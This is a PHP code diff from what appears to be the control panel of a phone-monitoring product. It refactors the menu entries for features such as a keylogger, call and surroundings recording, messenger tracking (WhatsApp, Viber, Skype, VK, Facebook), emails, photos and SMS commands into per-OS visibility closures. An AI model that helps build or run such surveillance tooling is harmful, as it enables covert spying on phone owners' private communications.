@@ -62,76 +62,171 @@ $default = array(
         'locations' => 'View Locations',
         'bookmarks' => array(
             'name' => 'View Bookmarks',
-            'hideOS' => array('blackberry')
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                }
+                
+                return true;
+            }
         ),
         'browserHistory' => array(
             'name' => 'View Browser History',
-            'hideOS' => array('blackberry')
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                }
+                
+                return true;
+            }
         ),
         'calendar' => array(
             'name' => 'View Calendar',
-            'hideOS' => array('blackberry')
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                }
+                
+                return true;
+            }
         ),
         'contacts' => array(
             'name' => 'View Contacts',
-            'hideOS' => array('blackberry')
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                }
+                
+                return true;
+            }
         ),
         'keylogger' => array(
             'name' => 'Keylogger',
-            'hideOS' => array('blackberry')
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                }
+                
+                return true;
+            }
         ),
         'surrounding' => array(
             'name' => 'Surrounding Records'
         ),
         'callRecordings' => array(
             'name' => 'Call Recordings',
-            'hideOS' => array('blackberry')
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                } elseif ($data['os'] == 'ios') {
+                    return preg_match('#^iphone 5#i', $data['model']);
+                }
+                
+                return true;
+            }
         ),
         'photos' => array(
             'name' => 'View Photos',
-            'hideOS' => array('blackberry')
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                }
+                
+                return true;
+            }
         ),
         'videos' => array(
             'name' => 'View Videos',
-            'hideOS' => array('blackberry')
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                }
+                
+                return true;
+            }
         ),
         'viber' => array(
             'name' => 'Viber Tracking',
-            'hideOS' => array('blackberry')
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                }
+                
+                return true;
+            }
         ),
         'skype' => array(
             'name' => 'Skype Tracking',
-            'hideOS' => array('blackberry')
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                }
+                
+                return true;
+            }
         ),
         'whatsapp' => array(
             'name' => 'Whatsapp Tracking',
-            'hideOS' => array('blackberry')
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                }
+                
+                return true;
+            }
         ),
         'facebook' => array(
             'name' => 'Facebook Messages',
-            'showOS' => array('android', 'ios')
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                }
+                
+                return true;
+            }
         ),
         'vk' => array(
             'name' => 'VK Messages',
             //'showLocale' => array('ru-RU'),
-            'showOS' => array('android', 'ios')
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                }
+                
+                return true;
+            }
         ),
         'emails' => array(
             'name' => 'View Emails',
-            'hideOS' => array('blackberry')
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                }
+                
+                return true;
+            }
         ),
         'applications' => array(
             'name' => 'View Applications',
-            'hideOS' => array('blackberry')
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                }
+                
+                return true;
+            }
         ),
         'smsCommands' => array(
             'name' => 'Sms Commands',
-            'hideOS' => array('blackberry'),
-            'versionOS' => array(
-                'android' => array(
-                    '<' => '4.4'
-                )
-            )
+            'show' => function($data) {
+                if ($data['os'] == 'blackberry') {
+                    return false;
+                } elseif ($data['os'] == 'android') {
+                    return compareOSVersion('android', '4.4', $data['os_version'], '<');
+                }
+                
+                return true;
+            }
         ),
         'settings' => 'Phone Settings'
     ),
